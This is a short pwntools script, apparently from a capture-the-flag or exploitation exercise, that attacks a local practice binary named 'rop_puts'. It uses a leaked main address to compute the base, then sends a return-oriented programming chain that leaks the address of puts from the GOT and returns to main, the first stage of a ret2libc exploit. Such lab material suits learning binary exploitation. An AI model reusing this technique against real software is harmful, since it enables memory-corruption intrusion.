from pwn import *

p = process('./rop_puts')
gdb.attach(p, gdbscript='')
e = ELF('./rop_puts')
libc = e.libc

p.readline()
p.readline()

main_addr = int(p.readline().decode(), 16)
base_addr = main_addr - e.symbols['main']
print("Main_Addr:", hex(main_addr))
print("Base_Addr:", hex(base_addr))
pop_rdi = 0x0000000000001191 + base_addr

payload = b""
payload += b"A" * 8
payload += b"B" * 8
payload += p64(pop_rdi)
payload += p64(base_addr + e.got['puts'])
payload += p64(base_addr + e.plt['puts'])
payload += p64(main_addr)

p.sendline(payload)
p.interactive()
